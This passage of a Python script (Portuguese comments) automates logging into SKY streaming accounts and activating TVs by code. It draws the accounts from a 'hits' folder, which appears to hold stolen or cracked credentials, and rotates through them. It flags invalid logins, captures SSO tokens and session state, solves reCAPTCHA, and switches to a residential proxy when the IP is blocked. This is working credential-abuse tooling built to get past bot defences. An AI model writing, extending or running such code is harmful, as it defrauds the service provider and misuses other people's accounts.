                            print(f"[*] [Playwright] Clicando no botão [ SKY ]...")
                            loc.first.click(timeout=2500)
                            clicou_sky = True
                            try:
                                page.wait_for_selector("input[name='username'], input#username, input[name='email'], input[type='email'], input[placeholder*='e-mail' i]", timeout=4000)
                            except Exception:
                                time.sleep(1.2)
                            break
                    except Exception:
                        pass

                if not clicou_sky:
                    try:
                        btn_role = page.get_by_role("button", name="SKY", exact=True)
                        if btn_role.count() > 0 and btn_role.first.is_visible():
                            print("[*] [Playwright] Clicando no botão [ SKY ] via role...")
                            btn_role.first.click(timeout=2500)
                            clicou_sky = True
                            try:
                                page.wait_for_selector("input[name='username'], input#username, input[name='email'], input[type='email'], input[placeholder*='e-mail' i]", timeout=4000)
                            except Exception:
                                time.sleep(1.2)
                    except Exception:
                        pass

                # Trata captcha inicial se houver
                resolver_recaptcha_se_existir(page, max_wait_sec=15)

                # ── PREENCHIMENTO RÁPIDO DO FORMULÁRIO DE LOGIN SKY ───────────────
                print(f"[*] [Playwright] Preenchendo credenciais SKY ({email})...")

                user_selectors = [
                    "input[name='username']",
                    "input#username",
                    "input[name='login']",
                    "input#login",
                    "input[name='email']",
                    "input#email",
                    "input[type='email']",
                    "input[placeholder*='e-mail' i]",
                    "input[placeholder*='cpf' i]",
                    "input[placeholder*='celular' i]",
                    "input[placeholder*='usuário' i]",
                    "input[placeholder*='digite seu' i]",
                    "input[type='text']",
                ]
                campo_usuario = None
                for sel in user_selectors:
                    try:
                        loc = page.locator(sel)
                        if loc.count() > 0 and loc.first.is_visible():
                            campo_usuario = loc.first
                            break
                    except Exception:
                        pass

                if not campo_usuario:
                    raise Exception("Não foi possível localizar o campo de login na tela da SKY.")

                campo_usuario.click()
                campo_usuario.fill(email)

                pass_selectors = [
                    "input[name='password']",
                    "input#password",
                    "input[name='senha']",
                    "input#senha",
                    "input[type='password']",
                    "input[placeholder*='senha' i]",
                ]
                campo_senha = None
                for sel in pass_selectors:
                    try:
                        loc = page.locator(sel)
                        if loc.count() > 0 and loc.first.is_visible():
                            campo_senha = loc.first
                            break
                    except Exception:
                        pass

                if not campo_senha:
                    raise Exception("Não foi possível localizar o campo de senha na tela da SKY.")

                campo_senha.click()
                campo_senha.fill(password)

                btn_entrar_selectors = [
                    "button[type='submit']",
                    "button:has-text('Entrar')",
                    "button:has-text('Acessar')",
                    "button:has-text('Continuar')",
                    "button:has-text('Fazer Login')"
                ]
                btn_entrar = None
                for sel in btn_entrar_selectors:
                    try:
                        loc = page.locator(sel)
                        if loc.count() > 0 and loc.first.is_visible():
                            btn_entrar = loc.first
                            break
                    except Exception:
                        pass

                # Submete o formulário
                if not btn_entrar:
                    campo_senha.press("Enter")
                else:
                    btn_entrar.click()

                print("[*] [Playwright] Credenciais enviadas. Aguardando autenticação e redirecionamento...")

                # ── AGUARDA REDIRECIONAMENTO OU RESOLVE CAPTCHA SE SURGIR ─────
                max_espera_loops = 35 if not headless else 20
                login_concluido = False

                for _ in range(max_espera_loops):
                    url_atual = page.url.lower()

                    # Se já saiu do domínio de login (vrioservices) e voltou para skymais
                    if "vrioservices" not in url_atual and "auth.sky" not in url_atual:
                        login_concluido = True
                        break

                    # Detecção contínua de reCAPTCHA
                    tem_captcha = False
                    for f in page.frames:
                        if "recaptcha" in f.url and "bframe" in f.url:
                            tem_captcha = True
                            break
                    if tem_captcha:
                        resolver_recaptcha_se_existir(page, max_wait_sec=30 if not headless else 15)

                    # Detecção imediata de mensagem de erro de login/senha
                    erro_loc = page.locator(".error-message, [role='alert'], .feedback-error, .alert-danger, [class*='feedback'], [class*='error'], [class*='alert'], span:has-text('inválid'), span:has-text('invalid'), span:has-text('incorret'), span:has-text('valido'), span:has-text('válido'), p:has-text('incorret'), p:has-text('valido'), p:has-text('válido'), p:has-text('não encontramos'), div:has-text('incorret'), div:has-text('valido')")
                    if erro_loc.count() > 0 and erro_loc.first.is_visible():
                        msg_err = erro_loc.first.inner_text().strip()
                        if len(msg_err) > 3:
                            registrar_conta_invalida(email, msg_err)
                            raise Exception(f"Credenciais inválidas SKY ({email}): {msg_err}")

                    try:
                        content_txt = page.content().lower()
                        for err_key in ["digite o e-mail ou celular", "credenciais incorretas", "usuário ou senha", "senha incorreta", "não encontramos uma conta"]:
                            if err_key in content_txt:
                                registrar_conta_invalida(email, err_key)
                                raise Exception(f"Credenciais inválidas SKY ({email}): {err_key}")
                    except Exception as ex:
                        if "Credenciais inválidas" in str(ex):
                            raise ex

                    time.sleep(0.5)

                if not login_concluido:
                    stamp = int(time.time())
                    screenshot_path = os.path.join(SCREENSHOTS_DIR, f"login_travado_{sanitizar_nome_arquivo(email)}_{stamp}.png")
                    try:
                        page.screenshot(path=screenshot_path)
                    except Exception:
                        pass
                    raise Exception(f"Login SKY não concluiu a tempo para {email}. Pulando para a próxima conta...")

                print(f"[✓] [Playwright] Login SKY autenticado! Redirecionado para: {page.url}")

                # Garante que estamos na tela de ativação da TV
                if "ativar" not in page.url.lower():
                    print(f"[*] [Playwright] Redirecionando para tela de ativação: {URL_ATIVAR}...")
                    page.goto(URL_ATIVAR, wait_until="domcontentloaded", timeout=20000)
                    time.sleep(2.5)

                # Salva sessão autenticada
                try:
                    context.storage_state(path=session_file)
                    print(f"[✓] [Playwright] Sessão SKY salva com sucesso em {session_file}")
                except Exception:
                    pass

            # ── 3. PREENCHE O CÓDIGO DA TV (6 DÍGITOS) E CLICA ATIVAR ───
            print(f"[*] [Playwright] Preenchendo código da TV: {tv_code}...")

            campo_preenchido = False
            for tentativa in range(15):
                fechar_popups_bloqueantes(page)
                campo_preenchido = preencher_codigo_tv(page, tv_code)
                if campo_preenchido:
                    break
                time.sleep(0.5)

            if not campo_preenchido:
                stamp = int(time.time())
                screenshot_path = os.path.join(SCREENSHOTS_DIR, f"tela_sem_campo_{tv_code}_{stamp}.png")
                try:
                    page.screenshot(path=screenshot_path)
                    print(f"[*] [Playwright] Screenshot salvo em: {screenshot_path}")
                except Exception:
                    pass
                raise Exception(f"Não foi possível localizar o campo para digitar o código da TV na tela (URL atual: {page.url}). Screenshot salvo.")

            # ── 4. ANALISA RESULTADO NA TELA ────────────────────────────
            print("[*] [Playwright] Aguardando confirmação da ativação...")
            termos_sucesso_reais = [
                "muito bem", "sua tv foi verificada", "aproveitar o sky",
                "dispositivo ativado", "vinculado com sucesso", "tela ativada", 
                "pronto para assistir", "código aceito", "sucesso", "conectado",
                "parabéns", "obrigado", "sua tv está pronta"
            ]
            termos_falha = [
                "código expirado", "código inválido", "codigo invalido",
                "não encontrado", "tente novamente", "limite de telas",
                "limite de dispositivos", "ocorreu um erro",
                "não foi possível ativar", "código incorreto"
            ]

            ativado_sucesso = False
            mensagem_final = ""

            for tentativa_espera in range(40):
                time.sleep(0.1)

                if ativacao_confirmada_via_api[0]:
                    ativado_sucesso = True
                    mensagem_final = "TV ativada com sucesso! Confirmado na plataforma Sky+."
                    break

                conteudo_pagina = page.content().lower()

                # Verifica tela de sucesso real
                for s in termos_sucesso_reais:
                    if s in conteudo_pagina:
                        ativado_sucesso = True
                        mensagem_final = f"TV ativada com sucesso! Confirmado na tela ({s})."
                        break
                if ativado_sucesso:
                    break

                # Verifica erros específicos
                for f in termos_falha:
                    if f in conteudo_pagina:
                        mensagem_final = f"Falha na ativação da TV: {f.capitalize()}."
                        break
                if mensagem_final:
                    break

                # Se o botão PRONTO! ainda estiver visível, clica novamente a cada 600ms
                if tentativa_espera > 0 and tentativa_espera % 6 == 0:
                    btn_pronto = page.locator("button:has-text('PRONTO'), button:text-is('PRONTO!'), button:has-text('Pronto'), button[type='submit']")
                    if btn_pronto.count() > 0 and btn_pronto.first.is_visible():
                        try:
                            btn_pronto.first.click(force=True, timeout=500)
                            page.keyboard.press("Enter")
                        except Exception:
                            pass

            stamp = int(time.time())
            screenshot_path = os.path.join(SCREENSHOTS_DIR, f"resultado_{tv_code}_{stamp}.png")
            try:
                page.screenshot(path=screenshot_path)
            except Exception:
                pass

            if not ativado_sucesso and not mensagem_final:
                mensagem_final = f"Código {tv_code} não foi confirmado na tela (a página ainda estava aguardando)."
                ativado_sucesso = False

            if ativado_sucesso:
                try:
                    context.storage_state(path=session_file)
                except Exception:
                    pass
                registrar_conta_ativada(email, password, tv_code)

            tempo_total = round(time.time() - inicio, 2)
            context.close()

            jwt_token = tokens_capturados.get("ssoToken") or tokens_capturados.get("idToken")
            if jwt_token:
                try:
                    from gerenciador_contas import adicionar_ou_atualizar_conta
                    adicionar_ou_atualizar_conta(email=email, sso_token=jwt_token, password=password)
                except Exception:
                    pass

            return {
                "success": ativado_sucesso,
                "message": mensagem_final,
                "conta": email,
                "code": tv_code,
                "status": 200 if ativado_sucesso else 400,
                "screenshot": screenshot_path,
                "tempo_segundos": tempo_total
            }

    except Exception as e:
        tempo_total = round(time.time() - inicio, 2)
        err_str = str(e)
        print(f"[!] [Playwright] Erro: {err_str}")

        if "IP_BLOQUEADO_GOOGLE" in err_str:
            return {
                "success": False,
                "motivo": "IP_BLOQUEADO_GOOGLE",
                "message": "IP local bloqueado pelo Google reCAPTCHA.",
                "conta": email,
                "code": tv_code,
                "status": 429,
                "screenshot": None,
                "tempo_segundos": tempo_total
            }

        try:
            stamp = int(time.time())
            screenshot_path = os.path.join(SCREENSHOTS_DIR, f"erro_{tv_code}_{stamp}.png")
            if 'page' in locals() and page:
                page.screenshot(path=screenshot_path)
        except Exception:
            screenshot_path = None

        return {
            "success": False,
            "message": f"Erro na automação: {err_str}",
            "conta": email,
            "code": tv_code,
            "status": 500,
            "screenshot": screenshot_path,
            "tempo_segundos": tempo_total
        }


# =============================================================================
# LIMPEZA DE ARQUIVOS OBSOLETOS
# =============================================================================

def limpar_arquivos_obsoletos():
    """Apaga automaticamente arquivos legados e desnecessários da pasta e desativa popups em perfis existentes."""
    itens = [
        "payload.b64",
        "payload_paramount.b64",
        "payload_web.b64",
        "profile_token.txt",
        "sso_token.txt",
        "recaptcha_solver.py",
        "sky.py",
        "ativador_tv.py",
        "servidor_web.py"
    ]
    for nome in itens:
        p = os.path.join(BASE_DIR, nome)
        if os.path.exists(p):
            try:
                os.remove(p)
            except Exception:
                pass

    if os.path.exists(PROFILE_DIR):
        try:
            for item in os.listdir(PROFILE_DIR):
                full_p = os.path.join(PROFILE_DIR, item)
                if os.path.isdir(full_p):
                    desativar_gerenciador_senhas_perfil(full_p)
        except Exception:
            pass


# =============================================================================
# CLI TURBO - ZERO PERGUNTAS, DIRETO AO PONTO
# =============================================================================

def main():
    limpar_arquivos_obsoletos()

    contas_hits = carregar_contas_hits()
    counts = obter_contagem_ativacoes()
    nunca_usadas = sum(1 for c in contas_hits if counts.get(c[0].strip().lower(), 0) == 0)

    print("\n" + "=" * 65)
    print("        ⚡ SKY TV ATIVADOR TURBO (PLAYWRIGHT PRO) ⚡")
    print("=" * 65)
    print(f"  [+] {len(contas_hits)} contas prontas | {nunca_usadas} contas virgens (prioridade máxima)")
    print(f"  [+] Conexão Turbo Direta (Proxy DataImpulse em Standby para auto-failover)")
    print("=" * 65)

    if len(sys.argv) > 1 and len(sys.argv[1].strip()) == 6 and sys.argv[1].strip().isdigit():
        cod = sys.argv[1].strip()
        print(f"\n[📺] Código da TV detectado via comando: {cod}")
    else:
        cod = input("\n📺 Digite o código de 6 dígitos exibido na TV: ").strip().upper()
        if not cod:
            print("[!] Código não informado!")
            sys.exit(0)

    if not contas_hits:
        print("[!] Nenhuma conta encontrada na pasta hits/!")
        sys.exit(1)

    MAX_TENTATIVAS = 6
    sucesso = False
    ultimo_res = None
    usar_proxy = False  # Começa direto (máxima velocidade: ~7 segundos)

    for idx, (em_sel, pw_sel) in enumerate(contas_hits[:MAX_TENTATIVAS], 1):
        usos = counts.get(em_sel.strip().lower(), 0)
        modo_str = "Proxy DataImpulse (BR)" if usar_proxy else "Conexão Direta"
        print(f"\n[{idx}/{min(MAX_TENTATIVAS, len(contas_hits))}] [🚀] Ativando com: {em_sel} ({usos} TVs | {modo_str})...")

        res = ativar_tv_playwright(email=em_sel, password=pw_sel, tv_code=cod, headless=False, usar_proxy=usar_proxy)
        ultimo_res = res

        # Se o Google reCAPTCHA bloqueou o IP local, ativa o Proxy DataImpulse e retenta imediatamente
        if res.get("motivo") == "IP_BLOQUEADO_GOOGLE" and not usar_proxy:
            print("\n[⚡] Google reCAPTCHA atingiu limite de consultas no IP local!")
            print("[⚡] Ativando Proxy Residencial DataImpulse (Brasil) automaticamente...")
            usar_proxy = True
            res = ativar_tv_playwright(email=em_sel, password=pw_sel, tv_code=cod, headless=False, usar_proxy=True)
            ultimo_res = res

        if res.get("success"):
            sucesso = True
            print("\n" + "=" * 65)
            print("                🎉 ATIVAÇÃO CONCLUÍDA COM SUCESSO! 🎉")
            print("=" * 65)
            print(f"  📺 Código TV  : {cod}")
            print(f"  👤 Conta SKY  : {em_sel}")
            print(f"  ⏱️  Tempo Total: {res.get('tempo_segundos', 0)}s")
            print(f"  ✅ Status     : {res.get('message', 'MUITO BEM! Sua TV foi verificada.')}")
            print("=" * 65)
            break
        else:
            print(f"[!] Conta {em_sel}: {res.get('message')}")
            if idx < min(MAX_TENTATIVAS, len(contas_hits)):
                print("[*] Rotacionando automaticamente para a próxima conta...")
                time.sleep(1)

    if not sucesso and ultimo_res:
        print("\n" + "=" * 65)
        print("          [!] NÃO FOI POSSÍVEL CONCLUIR A ATIVAÇÃO")
        print("=" * 65)
        print(f"  Último erro: {ultimo_res.get('message')}")
        print("=" * 65)


if __name__ == "__main__":
    main()
